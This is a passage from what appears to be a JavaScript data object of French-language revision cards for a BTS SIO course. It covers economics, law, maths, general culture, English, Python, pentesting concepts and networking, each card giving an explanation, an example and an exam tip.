"herzberg": ["Herzberg distingue ce qui évite le mécontentement (facteurs d'hygiène : salaire, conditions de travail) de ce qui motive vraiment (facteurs moteurs : reconnaissance, responsabilité, intérêt du travail). Maslow classe les besoins en pyramide.", "Augmenter le salaire calme l'insatisfaction ; confier un projet intéressant et reconnaître le travail motive.", "Pour Herzberg, le salaire n'est PAS un facteur de motivation durable : piège très fréquent."],
"rse": ["La RSE, c'est l'entreprise qui prend en compte, en plus du profit, ses effets sur l'environnement et sur la société (salariés, clients, territoire). Elle améliore souvent l'image et l'attractivité.", "Matériel reconditionné, réduction de la consommation des serveurs, télétravail, mécénat de compétences, égalité femmes-hommes.", "Classe tes exemples selon les trois piliers : économique, social, environnemental."],
/* ───── E4 Économie ───── */
"marche": ["Analyser un marché, c'est décrire l'offre (qui vend, combien d'entreprises), la demande (qui achète, quels besoins), comment le prix se fixe, et comment le marché évolue.", "Le marché du cloud : quelques géants (oligopole), une demande en forte croissance, des barrières à l'entrée élevées.", "Utilise les chiffres des annexes et le vocabulaire : monopole, oligopole, concurrence monopolistique."],
"plateforme": ["Une plateforme met en relation deux groupes (vendeurs et acheteurs, chauffeurs et clients). Effet de réseau : plus il y a d'utilisateurs d'un côté, plus elle attire l'autre côté. Ça crée souvent un acteur dominant.", "Plus il y a de restaurants sur une appli de livraison, plus elle attire de clients, et inversement.", "Montre l'avantage pour CHAQUE côté du marché : c'est souvent la question posée."],
"asymetrie": ["Il y a asymétrie d'information quand l'un des deux sait quelque chose que l'autre ignore. Ça peut fausser le marché (sélection adverse, aléa moral). On la réduit avec des labels, garanties, avis clients, certifications.", "Un client ne peut pas juger la qualité réelle de la sécurité d'un prestataire : la certification ISO 27001 ou le label SecNumCloud rassure.", "Cite toujours une solution qui réduit l'asymétrie, en lien avec le cas."],
"concurrence": ["Le droit de la concurrence interdit les ententes (se mettre d'accord sur les prix), les abus de position dominante (profiter de sa puissance pour écraser les autres) et, entre entreprises, la concurrence déloyale (dénigrement, confusion, parasitisme).", "Un leader qui vend à perte pour éliminer un petit concurrent puis remonte ses prix → abus de position dominante.", "Être dominant n'est pas interdit ; c'est l'ABUS de cette position qui l'est."],
"financement": ["Une entreprise peut se financer par elle-même (autofinancement), par ses associés (augmentation de capital, levée de fonds), par emprunt bancaire, ou par d'autres moyens (crédit-bail, financement participatif, aides publiques).", "Une start-up lève 2 millions d'euros auprès d'un fonds d'investissement : financement par capitaux propres, sans remboursement mais avec perte d'une partie du contrôle.", "Donne avantage ET inconvénient : l'emprunt garde le contrôle mais coûte des intérêts ; la levée de fonds dilue le pouvoir."],
"statuts": ["SARL et SAS limitent toutes deux la responsabilité aux apports. La SAS est plus souple (statuts libres, président), très utilisée par les start-up ; la SARL est plus encadrée (gérant, règles fixées par la loi).", "Une start-up qui veut accueillir des investisseurs choisit plutôt une SAS.", "Ne parle pas de « capital minimum » : il n'y en a plus (1 € suffit) pour ces deux formes."],
/* ───── E3 Mathématiques ───── */
"bases": ["Pour passer en binaire, on divise par 2 et on lit les restes de bas en haut, ou on décompose en puissances de 2. Pour l'hexadécimal, on regroupe les bits par 4.", "172 = 128 + 32 + 8 + 4 = 1010 1100 en binaire → A C en hexadécimal → 0xAC.", "Vérifie toujours en reconvertissant. En réseau, les masques comme 255.255.255.192 = 11111111.11111111.11111111.11000000."],
"bool": ["L'algèbre de Boole calcule avec vrai/faux. De Morgan dit comment « distribuer » une négation : la négation d'un ET devient un OU des négations, et inversement.", "non(a ET b) = non a OU non b. Dans un programme : !(age >= 18 && inscrit) ⇔ (age < 18 || !inscrit).", "On n'oublie pas d'inverser l'opérateur : la négation de « ET » est un « OU »."],
"congruence": ["a ≡ b [n] veut dire que a et b ont le même reste dans la division par n. C'est l'arithmétique « de l'horloge ».", "17 ≡ 2 [5] car 17 = 3×5 + 2. 23 h + 5 h = 4 h : 28 ≡ 4 [24].", "Le reste doit être entre 0 et n−1. Pour un nombre négatif, ajoute n jusqu'à revenir dans cet intervalle."],
"matrices": ["Un graphe peut se coder dans un tableau : la case (i, j) vaut 1 s'il y a un arc de i vers j. En élevant cette matrice à la puissance k, on compte les chemins de longueur k.", "M² [1][3] = 2 signifie qu'il y a 2 chemins de longueur 2 du sommet 1 au sommet 3.", "La matrice d'un graphe orienté n'est pas forcément symétrique ; celle d'un graphe non orienté l'est."],
"ensembles": ["Pour compter des possibilités : si chaque position peut prendre n valeurs et qu'il y a k positions, il y a n^k possibilités (avec répétition, ordre important).", "Mots de passe de 8 caractères parmi 62 : 62⁸ ≈ 2,18 × 10¹⁴ possibilités. C'est la base du calcul de résistance à la force brute.", "Si l'ordre ne compte pas et sans répétition, on utilise les combinaisons C(n, k), pas n^k."],
"karnaugh": ["Le tableau de Karnaugh range les valeurs d'une fonction booléenne pour repérer visuellement des regroupements de 1 (par 1, 2, 4, 8). Chaque regroupement donne un terme simplifié.", "Un groupe de 4 cases où seule la variable a reste constante (a = 1) donne simplement le terme a.", "Les lignes et colonnes suivent le code de Gray (00, 01, 11, 10), et les bords se touchent : un groupe peut « faire le tour »."],
"predicats": ["La négation de « pour tout x, P(x) » est « il existe un x tel que non P(x) ». Une implication P ⇒ Q n'est fausse que dans UN cas : P vrai et Q faux.", "« Tous les serveurs sont à jour » est faux dès qu'il existe UN serveur pas à jour.", "« Si P alors Q » est vraie quand P est faux, quoi que vaille Q : ça surprend, mais c'est la règle."],
"premiers": ["On décompose un entier en le divisant successivement par les plus petits nombres premiers possibles. Cela sert à calculer PGCD et PPCM, et c'est au cœur de la cryptographie (RSA).", "360 = 2³ × 3² × 5.", "1 n'est pas premier. Pour tester si n est premier, il suffit de tester les diviseurs jusqu'à √n."],
"rsa": ["Un chiffrement affine transforme chaque lettre (codée par un nombre x) en y = ax + b modulo 26. Pour déchiffrer, il faut l'inverse de a modulo 26, qui n'existe que si a et 26 n'ont pas de diviseur commun.", "Avec a = 3, b = 5 : la lettre C (x = 2) devient y = 11 → L. L'inverse de 3 modulo 26 est 9 car 3 × 9 = 27 ≡ 1.", "Si a est pair (ou multiple de 13), on ne peut pas déchiffrer : deux lettres donnent le même résultat."],
"calcmat": ["On multiplie ligne par colonne : le coefficient (i, j) du produit est la somme des produits des éléments de la ligne i de A par ceux de la colonne j de B. Le nombre de colonnes de A doit être égal au nombre de lignes de B.", "(1 2 ; 3 4) × (5 ; 6) = (1×5 + 2×6 ; 3×5 + 4×6) = (17 ; 39).", "Le produit n'est pas commutatif : A × B ≠ B × A en général."],
"graphes": ["Dans un graphe orienté : un prédécesseur arrive sur le sommet, un successeur en part. Un chemin suit les flèches ; un circuit revient au point de départ. Les niveaux classent les sommets (niveau 0 : aucun prédécesseur).", "Tâches d'un projet : A et B sont de niveau 0 ; C dépend de A et B → niveau 1.", "Un graphe avec un circuit ne peut pas être découpé en niveaux (et un projet avec un circuit est impossible)."],
"pert": ["On calcule les dates au plus tôt de gauche à droite (on prend le MAX des arrivées), puis au plus tard de droite à gauche (on prend le MIN). Les tâches sans marge forment le chemin critique : tout retard sur elles retarde le projet.", "Projet de 20 jours, tâche C : début au plus tôt 5, au plus tard 8 → marge totale de 3 jours.", "Dans le calcul au plus tôt, c'est le MAXIMUM quand plusieurs tâches arrivent : beaucoup d'élèves prennent le minimum."],
"suites": ["Arithmétique : on ajoute toujours la même raison r (uₙ = u₀ + n r). Géométrique : on multiplie toujours par la même raison q (uₙ = u₀ × qⁿ).", "Un abonnement à 50 € qui augmente de 3 € par an : arithmétique. Un nombre de données qui augmente de 10 % par an : géométrique de raison 1,1.", "Une hausse de 10 % donne q = 1,1, pas q = 0,1. Somme géométrique : premier terme × (1 − q^nombre de termes) / (1 − q)."],
"algo": ["Il faut savoir lire et écrire : variables, affectation, conditions (si/sinon), boucles (pour, tant que), fonctions, et tableaux. On fait tourner l'algorithme « à la main » dans un tableau de valeurs.", "Algorithme qui compte les mots de passe trop courts dans une liste : un compteur, une boucle « pour » sur la liste, un « si longueur < 12 ».", "Pour un « tant que », vérifie que la condition finit par devenir fausse, sinon boucle infinie."],
/* ───── E1 Culture générale ───── */
"cge-epreuve": ["Depuis 2025, l'épreuve dure 3 heures et porte sur un seul thème par an. On répond d'abord à des questions sur des documents (textes et images), puis on écrit un essai argumenté.", "Session 2027 : thème « Le vrai du faux », épreuve le mardi 11 mai 2027 de 9 h à 12 h. Répartition conseillée : 1 h 15 pour les questions, 1 h 30 pour l'essai, 15 min de relecture.", "Ne prépare plus une synthèse de 4 documents : l'épreuve a changé. Vérifie le format avec ton professeur."],
"cge-synthese": ["Chaque question vérifie que tu as compris et analysé les documents. On répond en phrases, en s'appuyant sur des citations courtes que l'on explique.", "« Dans le document 2, Umberto Eco qualifie certaines copies de “faux absolu” : il montre ainsi que l'imitation parfaite peut sembler plus vraie que l'original. »", "Ne pas répondre avec ses connaissances générales à la place des documents : la culture ne fait que prolonger l'analyse du corpus."],
"cge-regles": ["Une bonne réponse répond exactement à la question, cite le document et explique la citation. La longueur suit le barème.", "Question à 3 points sur deux documents : un paragraphe qui compare les deux, avec une citation de chacun.", "Paraphraser (recopier le texte avec d'autres mots) sans analyser rapporte peu de points."],
"cge-intro": ["Une image se lit comme un texte : on la présente, on la décrit précisément, puis on dit ce qu'elle signifie.", "Une photo truquée diffusée sur un réseau social : cadrage serré qui cache le contexte, couleurs saturées, légende choc → elle cherche à provoquer une émotion avant la réflexion.", "Décrire sans interpréter (« il y a un homme et un arbre ») ne répond pas à la question : relie chaque détail à son effet."],
"cge-ecriture": ["L'essai donne TON avis argumenté sur une question liée au thème, appuyé sur des exemples précis.", "Sujet : « Peut-on se passer de mensonges ? » → I. Le mensonge détruit la confiance (exemples) / II. Mais certains mensonges protègent ou font vivre la fiction (exemples) / III. Ce qui compte, c'est l'intention et le respect de l'autre.", "Un argument sans exemple, ou un exemple sans explication, vaut peu : idée + exemple + explication, à chaque paragraphe."],
"cge-refs": ["Les références rendent l'essai solide et montrent ta culture. Prépare-les à l'avance, sur le thème de l'année.", "La Servante écarlate (Atwood) : un régime totalitaire réécrit la réalité et le langage pour contrôler les esprits.", "Une référence doit être précise (titre, auteur) et expliquée, pas seulement citée."],
"cge-langue": ["La correction de la langue compte dans la note : accords, homophones, ponctuation, phrases bien construites. Une relecture de 10 minutes centrée sur ces erreurs rapporte des points faciles.", "« Les documents qu'il a lus » (accord avec le COD placé avant) ; « ces enjeux » (démonstratif) / « ses enjeux » (possessif).", "Relis une fois uniquement pour les accords, une fois uniquement pour les homophones : c'est plus efficace qu'une seule relecture générale."],
/* ───── E2 Anglais ───── */
"ang-epreuve": ["L'écrit (2 h) demande de comprendre des documents en anglais (compte rendu en français) et de rédiger en anglais (souvent un courriel professionnel). L'oral (20 min) porte sur des documents liés à l'informatique et à l'entreprise.", "Exemple d'écrit : compte rendu en français d'un article sur la cybersécurité, puis réponse en anglais à un client mécontent.", "Vérifie les modalités exactes de ta session (dictionnaire autorisé ou non) auprès de ton professeur."],
"ang-cr": ["Le compte rendu restitue en français les informations essentielles du document, dans l'ordre logique, avec tes mots, sans ajouter d'avis. Commence par présenter le document (source, date, thème).", "« Cet article, publié dans The Guardian en mars 2025, traite de… L'auteur explique d'abord… puis… »", "Ne traduis pas mot à mot et ne commente pas : on évalue ta compréhension, pas ton opinion."],
"ang-mail": ["Un courriel professionnel suit une structure fixe : salutation, raison du message, détails, action attendue, formule de politesse. Les formules toutes faites rapportent des points.", "Dear Ms Smith, I am writing to inform you that… Please find attached… I look forward to hearing from you. Kind regards,", "« Dear Sir or Madam » si tu ne connais pas le nom ; « Yours faithfully » va avec, « Yours sincerely » va avec un nom."],
"ang-vocab1": ["Ce vocabulaire revient dans presque tous les documents techniques. Entraîne-toi à le dire et à l'écrire.", "firewall (pare-feu), vulnerability / flaw (faille), update (mise à jour), backup (sauvegarde), password (mot de passe), to encrypt (chiffrer), malware (logiciel malveillant), phishing (hameçonnage).", "Faux ami : « actually » veut dire « en fait », pas « actuellement » (currently)."],
"ang-vocab2": ["Le vocabulaire du métier de développeur et du matériel, pour parler de ton stage et de tes projets.", "software (logiciel), hardware (matériel), developer, database, bug, to deploy (déployer), feature (fonctionnalité), user (utilisateur).", "« Software » et « hardware » sont indénombrables : pas de « softwares »."],
"ang-liens": ["Les mots de liaison structurent ton discours et montrent que tu argumentes. Prépare-en deux ou trois par catégorie.", "Moreover (de plus), However (cependant), Therefore (donc), For instance (par exemple), To sum up (pour résumer).", "Attention à la ponctuation : « However, … » prend une virgule après en début de phrase."],
"ang-oral": ["À l'oral : présenter le document, résumer les idées principales, donner ton point de vue, puis faire le lien avec ton expérience (stage, projets). Ça montre que tu sais parler de ton métier en anglais.", "The document is an article from Wired. It deals with… The main idea is… In my opinion… During my internship, I…", "Ne lis pas tes notes : quelques mots-clés suffisent. Parler un peu imparfaitement mais avec aisance vaut mieux que réciter."],
/* ───── E5 ───── */
"cge-theme": ["Le thème 2027 interroge la frontière entre vrai et faux : informations manipulées, rumeurs, mais aussi fiction et art qui « mentent » pour dire une vérité.", "Une vidéo truquée par l'IA (deepfake) diffusée pendant une élection : faux qui se fait passer pour vrai. À l'inverse, un roman d'anticipation invente une société pour révéler les dangers de la nôtre.", "Le thème ne se limite pas aux fake news : la fiction, l'art et l'illusion en font aussi partie."],
"cge-biblio": ["La bibliographie officielle donne des œuvres sur lesquelles s'appuyer, en particulier pour l'essai.", "Edgar Morin, La Rumeur d'Orléans : enquête sur une fausse rumeur qui s'est propagée dans une ville en 1969.", "Ne cite pas une œuvre que tu n'as pas lue ou étudiée : une erreur sur son contenu se voit tout de suite."],
"cge-notions27": ["Ces expressions servent de « mots-clés » pour structurer tes idées sur le vrai et le faux.", "Une entreprise qui affiche une démarche écologique de façade (écoblanchiment) construit un « village Potemkine ».", "Explique toujours l'expression quand tu l'utilises : ne suppose pas que le correcteur fera le lien."],
"py-types": ["Chaque valeur a un type, et Python ne mélange pas les types tout seul : il faut convertir.", "input() renvoie toujours du texte : age = int(input(\"Âge ? \")) pour pouvoir faire des calculs.", "\"3\" + 4 provoque une erreur (TypeError) : on ne peut pas additionner du texte et un nombre."],
"py-cond": ["Une condition choisit quel bloc exécuter. Python lit les tests de haut en bas et s'arrête au premier vrai.", "if note >= 10: print(\"admis\")\nelif note >= 8: print(\"oral de rattrapage\")\nelse: print(\"ajourné\")", "= affecte une valeur, == compare. Et ne pas oublier les deux-points et l'indentation."],
"py-boucles": ["for sert quand on sait combien de tours faire (ou quand on parcourt une liste) ; while quand on répète jusqu'à ce qu'une condition change.", "for i in range(1, 4): print(i) affiche 1, 2, 3 (4 est exclu).", "range(5) va de 0 à 4, pas de 1 à 5 : c'est l'erreur la plus fréquente à l'examen."],
"py-listes": ["Une liste range plusieurs valeurs dans l'ordre ; on y accède par leur position, qui commence à 0.", "ports = [22, 80, 443] ; ports.append(3389) ; print(len(ports)) affiche 4.", "L[len(L)] provoque une erreur (IndexError) : le dernier indice est len(L) − 1."],
"py-dict": ["Un dictionnaire retrouve une valeur grâce à un nom (la clé) plutôt qu'à une position.", "services = {22: \"SSH\", 80: \"HTTP\"} ; print(services[22]) affiche SSH.", "Lire une clé absente provoque une erreur (KeyError) : tester avant avec in, ou utiliser d.get(cle)."],
"py-fonctions": ["Une fonction est un morceau de programme réutilisable : on lui donne des paramètres, elle renvoie un résultat.", "def masque(cidr): return 2 ** (32 - cidr) - 2 → masque(24) renvoie 254.", "print n'est pas return : une fonction qui affiche sans renvoyer donne None quand on veut utiliser son résultat."],
"py-chaines": ["Le texte se manipule beaucoup en informatique (logs, fichiers CSV) : découper, nettoyer, assembler.", "ligne = \"jdupont;Compta;actif\" ; nom, service, etat = ligne.split(\";\")", "s.upper() ne modifie pas s : il faut écrire s = s.upper()."],
"py-algos": ["La plupart des exercices reprennent quelques schémas : compteur, somme, maximum, recherche. Les connaître par cœur fait gagner beaucoup de temps.", "Maximum : m = L[0] puis for x in L: if x > m: m = x.", "Initialiser le maximum à 0 est faux si la liste ne contient que des nombres négatifs : initialiser avec le premier élément."],
"py-trace": ["Faire « tourner » un programme à la main, c'est jouer le rôle de l'ordinateur, ligne par ligne, en notant les valeurs des variables.", "s = 0 ; for i in range(3): s = s + i → tours : i=0 s=0 ; i=1 s=1 ; i=2 s=3 → s vaut 3.", "Aller trop vite et sauter un tour : écris chaque tour dans le tableau, même s'il paraît évident."],
"licenciement": ["Un licenciement doit toujours avoir une raison valable, et la loi distingue ce qui vient du salarié de ce qui vient de l'entreprise.", "Une ESN perd son principal client et supprime trois postes : motif économique. Un salarié qui copie des données clients sans autorisation : motif personnel (faute).", "Sans cause réelle et sérieuse, le licenciement est jugé abusif : le salarié obtient des indemnités devant le conseil de prud'hommes."],
"rupture-conv": ["La démission vient du salarié seul ; la rupture conventionnelle est un départ négocié à deux.", "Un développeur veut partir monter sa start-up : avec une rupture conventionnelle, il peut toucher le chômage pendant le lancement.", "La rupture conventionnelle ne concerne que le CDI et doit être homologuée : une simple lettre d'accord ne suffit pas."],
"surveillance": ["L'employeur peut contrôler, mais pas en cachette ni de façon excessive.", "Une caméra qui filme en permanence le poste d'un développeur est disproportionnée ; une caméra à l'entrée du local serveur, signalée, est justifiée.", "Ne pas oublier l'information préalable des salariés et du CSE : c'est souvent ce qui manque dans les cas."],
"donnees-salaries": ["Ce qui est sur l'ordinateur du travail est présumé professionnel, sauf si le salarié l'a clairement marqué comme personnel.", "Un dossier « Perso » sur le poste de travail ne peut pas être ouvert par l'employeur sans le salarié.", "La présomption joue dans les deux sens : un dossier nommé « Mes documents » n'est pas personnel."],
"ecommerce": ["Pour protéger le consommateur, la loi impose de la transparence et un délai pour changer d'avis.", "Un abonnement à un logiciel acheté en ligne par un particulier : 14 jours pour se rétracter, sauf s'il a commencé à l'utiliser en renonçant expressément à ce droit.", "Le droit de rétractation concerne les consommateurs, pas les professionnels entre eux."],
"structures": ["La structure dit qui dépend de qui et comment le travail est réparti.", "Une ESN organisée en équipes projet où chaque développeur dépend aussi d'un responsable technique : structure matricielle.", "Une structure matricielle favorise la transversalité mais peut créer des conflits de priorités entre les deux chefs."],
"management-styles": ["Le style de management, c'est la façon dont le responsable décide et associe (ou non) son équipe.", "Un responsable informatique qui organise des rétrospectives où l'équipe choisit ses outils : style participatif.", "Aucun style n'est parfait partout : en cas d'incident de sécurité majeur, des décisions rapides et directives sont nécessaires."],
"changement": ["Un changement échoue rarement à cause de la technique, plus souvent à cause des personnes qui n'y adhèrent pas.", "Remplacer le logiciel de paie : utilisateurs pilotes, formations courtes, documentation et support la première semaine.", "Imposer un nouvel outil du jour au lendemain sans explication crée des résistances : cite toujours l'accompagnement humain."],
"grh": ["Former ses salariés coûte moins cher que recruter dans un métier en tension, et les fidélise.", "Une PME finance une certification en cybersécurité à son technicien pour faire face aux nouvelles menaces.", "Ne confonds pas l'entretien professionnel (évolution, formation) et l'entretien annuel d'évaluation (résultats)."],
"innovation": ["Innover, c'est faire quelque chose de nouveau qui trouve son marché ; c'est ce qui fait progresser l'économie sur le long terme.", "Le cloud a fait disparaître une partie des salles serveurs internes mais a créé des métiers (architecte cloud, FinOps).", "Une invention n'est une innovation que si elle est adoptée par le marché."],
"regulation": ["Le marché ne règle pas tout seul certains problèmes : l'État fixe des règles et contrôle.", "Le règlement européen sur les marchés numériques (DMA) impose aux très grandes plateformes de ne pas favoriser leurs propres services.", "Ne réduis pas l'État à « il donne des subventions » : la régulation par les règles est souvent la réponse attendue."],
"numerique-emploi": ["Le numérique change surtout le contenu des métiers, plus qu'il ne les supprime en bloc.", "L'IA générative automatise une partie du support de niveau 1 mais augmente le besoin d'administrateurs et d'experts en sécurité.", "Évite les réponses extrêmes (« le numérique détruit l'emploi ») : présente les deux effets."],
"ang-temps": ["Le temps indique si l'action est finie, liée au présent ou générale.", "During my internship, I configured the firewall and I have learnt how to write clear documentation.", "« I have worked there last year » est faux : avec une date passée précise, on utilise le prétérit (I worked there last year)."],
"ang-phrasal": ["Ces verbes reviennent sans cesse dans les documents techniques et à l'oral.", "We rolled out the new VPN to all remote workers after we had set up the server.", "Backup (nom) s'écrit en un mot, to back up (verbe) en deux."],
"ang-opinion": ["L'oral évalue ta capacité à réagir et argumenter, pas seulement à résumer.", "In my opinion, AI is a useful tool for IT support. However, it cannot replace human judgement in security incidents.", "Éviter « I am agree » : on dit « I agree »."],
"ang-describe": ["Une structure toute prête permet de commencer l'oral avec assurance.", "The graph shows that ransomware attacks increased sharply between 2020 and 2023, then remained stable.", "Ne lis pas les chiffres un par un : décris la tendance générale puis donne un ou deux chiffres marquants."],
"ang-vocab3": ["Le vocabulaire du support revient dans les mails et les situations d'oral.", "Dear customer, we are sorry for the outage. Our team has applied a patch and the service is now back to normal.", "« Délai » ne se traduit pas par « delay » quand on parle d'une date limite : delay = retard, deadline = date limite."],
"pentest": ["C'est comme engager un serrurier pour essayer d'entrer chez soi : on découvre les points faibles avant un vrai cambrioleur.", "Une banque fait tester son site par un prestataire PASSI : il découvre une faille de contrôle d'accès qui permettait de voir les comptes d'autres clients.", "Un test d'intrusion n'est pas un scan automatique : il prouve qu'une faille est exploitable et en mesure l'impact."],
"pentest-legal": ["Sans papier signé, un « test » est une attaque, même avec de bonnes intentions.", "Un étudiant scanne le serveur de son lycée « pour voir » : accès ou tentative d'accès frauduleux, même s'il ne casse rien.", "L'autorisation doit venir de quelqu'un qui a le droit de la donner : pour un site hébergé chez un prestataire, l'hébergeur doit aussi être d'accord."],
"pentest-phases": ["On avance du plus discret (observer) au plus intrusif (exploiter), et tout finit par un rapport.", "Reconnaissance : une offre d'emploi de l'entreprise cite « Windows Server 2012 » → le testeur sait quoi chercher.", "Le rapport n'est pas une formalité : c'est le livrable que l'entreprise paie."],
"boites": ["La couleur dit ce que le testeur connaît au départ.", "Une entreprise donne un compte stagiaire au testeur pour vérifier ce qu'un salarié pourrait atteindre : boîte grise.", "La boîte noire n'est pas « la meilleure » : elle est réaliste mais laisse souvent des failles non trouvées faute de temps."],
"vuln-scan": ["C'est un contrôle automatique et répété, à compléter par des tests humains.", "Un scan mensuel signale qu'Apache 2.4.18 est vulnérable : l'équipe planifie la mise à jour.", "Ne pas confondre scan de vulnérabilités (automatique, liste des failles possibles) et test d'intrusion (humain, prouve et mesure)."],
"cvss": ["Le score dit à quel point la faille est grave en général ; le contexte dit à quel point elle l'est chez toi.", "CVSS 9,8 sur un serveur web exposé à Internet : correction immédiate. CVSS 7,5 sur une machine isolée sans données : plus tard.", "Ne trie pas seulement par score : une faille « moyenne » sur le serveur qui contient les données de santé peut passer avant."],
"osint": ["Avant d'attaquer, on observe : tout ce qui est public peut servir.", "Le profil professionnel d'un administrateur indique « expert Fortinet » : l'attaquant sait quel pare-feu chercher.", "L'OSINT est légal tant qu'on se limite aux informations publiques, mais il prépare souvent l'ingénierie sociale."],
"durcissement": ["Chaque constat du rapport doit avoir une correction précise et un responsable.", "Constat : RDP ouvert sur Internet. Correction : fermer le port 3389 au pare-feu, accès uniquement via VPN avec MFA.", "« Installer un antivirus » ne corrige pas un port exposé ou une version obsolète : la mesure doit répondre au constat."],
"red-blue": ["Le red team teste aussi la capacité de l'entreprise à voir et arrêter l'attaque, pas seulement les failles.", "Pendant un exercice red team, le SOC (blue team) doit détecter une connexion anormale à 3 h du matin.", "Participer à un bug bounty n'autorise que ce que dit son règlement : tester hors périmètre reste illégal."],
"labs": ["On apprend l'attaque pour mieux défendre, mais uniquement sur des terrains de jeu autorisés.", "Un étudiant SISR monte deux VM sur un réseau interne VirtualBox pour observer un scan avec Wireshark.", "Un « lab » branché sur le réseau de l'entreprise ou de l'école n'est plus isolé : risque pour les autres machines."],
"e5-epreuve": ["L'E5 est un oral de 40 minutes qui s'appuie sur ton portfolio et ton tableau de synthèse : tu présentes ton parcours et tes réalisations, puis le jury te questionne et peut te demander de montrer une réalisation.", "Le jury choisit une réalisation et demande : « Comment avez-vous géré cet incident ? Quel outil ? Qu'auriez-vous fait autrement ? »", "Prépare chaque réalisation pour pouvoir la montrer en direct et l'expliquer : contexte, besoin, solution, résultat, compétences du bloc 1."],
"e5-portfolio": ["Le portfolio montre ton parcours et prouve tes compétences. Le tableau de synthèse liste tes réalisations et coche les compétences du bloc 1 couvertes.", "Une page par réalisation : contexte, objectifs, outils, étapes, captures, bilan.", "Chaque compétence du bloc 1 doit être couverte au moins une fois dans le tableau : vérifie-le avant l'examen."],
"e5-bloc1": ["Le bloc 1 regroupe six compétences : gérer le patrimoine informatique, répondre aux incidents et demandes, développer la présence en ligne, travailler en mode projet, mettre à disposition un service informatique, organiser son développement professionnel.", "Une installation de GLPI couvre « gérer le patrimoine » et « répondre aux incidents ».", "« Organiser son développement professionnel » = veille + portfolio + projet professionnel : ne l'oublie pas."],
"e5-patrimoine": ["Gérer le patrimoine, c'est savoir ce que l'organisation possède (matériels, logiciels, licences), dans quel état, et le faire évoluer proprement.", "GLPI + agent d'inventaire : on voit chaque poste, ses logiciels installés et les licences disponibles.", "Pense aux licences : installer un logiciel sans licence expose l'entreprise à des sanctions (contrefaçon)."],
"e5-itil": ["Incident : quelque chose ne marche plus, on rétablit vite. Problème : la cause racine d'incidents qui se répètent, on la cherche et la corrige. Demande : l'utilisateur veut quelque chose de nouveau ou standard. Changement : modification planifiée du système.", "« Mon imprimante n'imprime plus » = incident. « Les imprimantes plantent tous les lundis » = problème. « Je voudrais un deuxième écran » = demande.", "Un incident peut être résolu sans connaître sa cause (contournement) ; un problème vise la cause."],
"e5-projet": ["Un projet a un début, une fin, un objectif et des ressources limitées. Outils : cahier des charges, découpage en tâches, Gantt (planning dans le temps), PERT (enchaînement et chemin critique), suivi et bilan.", "Migration de 30 postes vers Windows 11 : Gantt sur 6 semaines, jalons, tests sur 2 postes pilotes.", "Gantt montre le QUAND, PERT montre l'ORDRE et le chemin critique : ne les confonds pas."],
"e5-veille": ["La veille technologique, c'est surveiller régulièrement un sujet pour rester à jour. À l'oral, on attend : un sujet précis, des sources fiables, des outils, une organisation, et ce que tu en as appris.", "Sujet : « les attaques par rançongiciel sur les hôpitaux ». Outils : flux RSS du CERT-FR, Feedly, alertes Google. Synthèse mensuelle dans le portfolio.", "Un sujet trop large (« la cybersécurité ») est difficile à défendre : choisis un angle précis."],
"e5-ticket": ["Un ticket, c'est la trace écrite de chaque demande : rien ne se perd et on sait qui fait quoi. On traite d'abord ce qui a le plus d'impact et qui est le plus urgent.", "Le serveur de fichiers est inaccessible pour tout le service comptable la veille de la paie : impact fort, urgence forte, donc priorité 1, escaladé au niveau 2 si le N1 ne trouve pas en 15 minutes.", "À l'oral E5, montre un vrai ticket de ton stage (anonymisé) et explique la priorité choisie : le jury vérifie que tu sais qualifier, pas seulement réparer."],
"e5-sla": ["Le SLA, c'est la promesse chiffrée du service informatique : « on prend en charge en 1 heure et on résout en 4 heures les pannes bloquantes ».", "Un hébergeur garantit 99,9 % de disponibilité par mois, soit environ 43 minutes de panne maximum ; au-delà, il rembourse une partie de l'abonnement.", "Ne confonds pas délai de prise en charge (quelqu'un commence à traiter) et délai de résolution (le problème est réglé)."],
"e5-service": ["Un service mis en production sans test ni explication crée des pannes et des appels au support : on prépare le terrain avant.", "Nouvelle messagerie : tests sur 5 comptes, déploiement sur le service RH une semaine, guide d'une page pour configurer le téléphone, puis déploiement à tous.", "Pense aux deux documentations : celle de l'utilisateur (simple, avec captures) et celle de l'équipe technique (installation, configuration, dépannage)."],
"e5-presence": ["Être présent en ligne, ce n'est pas seulement avoir un site : il faut qu'on le trouve, qu'il soit fiable et qu'on surveille ce qui se dit de l'organisation.", "Une boulangerie met à jour ses horaires sur sa fiche Google, répond poliment à un avis négatif et publie ses nouveautés sur Instagram.", "Le site doit rester légal : mentions légales, bandeau cookies conforme et politique de confidentialité (RGPD)."],
/* ───── E6 SISR ───── */
"e6s-epreuve": ["L'E6 SISR est une épreuve pratique et orale (40 minutes) basée sur deux réalisations professionnelles. Le jury peut te demander de montrer, modifier ou dépanner ce que tu as fait.", "Le jury demande : « Ajoutez un nouveau VLAN pour le service comptabilité et vérifiez que le DHCP lui distribue des adresses. »", "Il faut maîtriser TES réalisations à fond : si tu ne sais pas expliquer une commande de ton propre TP, ça se voit."],
"e6s-ip": ["Dans un /n, il reste 32 − n bits pour les hôtes, donc 2^(32−n) adresses, moins 2 (réseau et diffusion) utilisables.", "192.168.1.64/26 : 62 hôtes de .65 à .126, diffusion .127, masque 255.255.255.192.", "N'oublie pas de retirer 2 adresses. Et la passerelle consomme une adresse d'hôte."],
"e6s-services": ["DNS traduit les noms en adresses (et l'inverse) ; DHCP donne automatiquement une configuration IP aux postes (adresse, masque, passerelle, DNS).", "Un poste reçoit 192.168.10.25/24, passerelle .254, DNS 192.168.10.1 par DHCP ; il résout srv-fichiers.entreprise.local via le DNS.", "Le DHCP fonctionne par diffusion : il ne traverse pas un routeur sans relais DHCP (ip helper-address)."],
"e6s-routage": ["Le routeur choisit la route la plus précise (masque le plus long) ; à défaut, la route par défaut. Le NAT permet à plusieurs machines privées de sortir sur Internet avec une seule adresse publique.", "ip route 10.0.2.0 255.255.255.0 192.168.1.2 ; route par défaut 0.0.0.0/0 vers la box.", "Une route doit exister dans les DEUX sens : si le retour n'est pas routé, le ping échoue."],
"e6s-virtu": ["Une machine virtuelle émule un ordinateur complet avec son propre système ; un conteneur partage le noyau de l'hôte, il est plus léger et démarre en quelques secondes.", "Proxmox ou VMware ESXi (hyperviseur de type 1) pour les serveurs ; Docker pour lancer une application web isolée.", "Type 1 = directement sur le matériel (serveurs) ; type 2 = sur un système existant (VirtualBox sur un PC)."],
